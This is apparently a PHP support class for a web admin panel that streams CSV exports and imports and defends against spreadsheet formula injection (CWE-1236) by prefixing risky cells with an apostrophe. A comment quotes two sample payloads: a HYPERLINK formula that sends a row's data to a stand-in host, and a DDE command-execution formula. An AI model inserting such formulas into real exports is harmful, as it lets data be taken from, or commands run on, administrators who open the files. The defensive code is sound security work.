<?php

declare(strict_types=1);

namespace PandaPanel\Support\Spreadsheet;

use Generator;

/**
 * CSV, written and read a row at a time.
 *
 * A stream rather than a string on both sides. An export of fifty thousand
 * records assembled in memory is a memory limit waiting to happen, and an
 * import read with `file()` is the same failure from the other direction —
 * so nothing here ever holds more than one row.
 */
final class Csv
{
    /**
     * Opens a file for writing and returns the handle, with a BOM already
     * written.
     *
     * The BOM is what makes Excel read UTF-8 as UTF-8 instead of as the
     * host's code page, which is the difference between a name and mojibake.
     *
     * @return resource
     */
    public static function open(string $path)
    {
        $handle = fopen($path, 'wb');

        if ($handle === false) {
            throw new SpreadsheetException(sprintf('Cannot write to %s.', $path));
        }

        fwrite($handle, "\u{FEFF}");

        return $handle;
    }

    /**
     * The characters a spreadsheet reads as the start of a formula.
     *
     * Tab and carriage return are here because Excel strips leading
     * whitespace before deciding, so `"\t=cmd"` is still a formula.
     *
     * @var list<string>
     */
    private const FORMULA_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * @param  resource  $handle
     * @param  list<string>  $row
     * @param  bool  $escapeFormulas  see `neutralize()`
     */
    public static function write($handle, array $row, bool $escapeFormulas = true): void
    {
        if ($escapeFormulas) {
            $row = array_map(self::neutralize(...), $row);
        }

        fputcsv($handle, $row, escape: '');
    }

    /**
     * Stops a spreadsheet executing a cell that came out of the database.
     *
     * A CSV cell beginning with `=`, `+`, `-` or `@` is a formula as far as
     * Excel, LibreOffice and Sheets are concerned, and they evaluate it when
     * the file is opened. `=HYPERLINK("http://x?"&A1,"Click")` exfiltrates the
     * row beside it to whoever typed it; `=cmd|'/c calc'!A1` is worse. The
     * attacker is anyone who can write a text field, and the victim is the
     * administrator who opens the export — which is exactly the shape of an
     * admin panel. It is CWE-1236, and quoting does not prevent it: CSV
     * quoting is about parsing the file, not about what the cell means once
     * parsed.
     *
     * The fix is a leading apostrophe, which every spreadsheet reads as "this
     * cell is text" and does not display. It changes the bytes, which is why
     * `Exporter::escapesFormulas()` can turn it off for a feed that another
     * *program* parses — there, nothing evaluates anything and the apostrophe
     * would be data corruption instead of a fix.
     *
     * XLSX needs none of this: `Xlsx` writes `t="inlineStr"` cells, and a
     * formula in that format lives in an `<f>` element the writer never
     * emits. A literal `=SUM(A1)` in an inline string is shown, not run.
     */
    public static function neutralize(string $value): string
    {
        if ($value === '') {
            return $value;
        }

        return in_array($value[0], self::FORMULA_PREFIXES, true)
            ? "'".$value
            : $value;
    }

    /**
     * Reads a file row by row.
     *
     * A generator, so a caller decides how much of the file it wants and the
     * rest is never read — which is what makes a header-only peek cheap.
     *
     * @return Generator<int, list<string>>
     */
    public static function read(string $path): Generator
    {
        $handle = fopen($path, 'rb');

        if ($handle === false) {
            throw new SpreadsheetException(sprintf('Cannot read %s.', $path));
        }

        try {
            $first = true;

            while (($row = fgetcsv($handle, escape: '')) !== false) {
                // A row of one empty cell is what a blank line reads as, and
                // it is not a record.
                if ($row === [null] || $row === ['']) {
                    continue;
                }

                $cells = array_map(
                    static fn (mixed $cell): string => $cell === null ? '' : (string) $cell,
                    $row,
                );

                if ($first) {
                    // Strip the BOM a spreadsheet wrote, or the first header
                    // is named "\u{FEFF}id" and matches nothing.
                    $cells[0] = preg_replace('/^\x{FEFF}/u', '', $cells[0]) ?? $cells[0];
                    $first = false;
                }

                yield $cells;
            }
        } finally {
            fclose($handle);
        }
    }
}
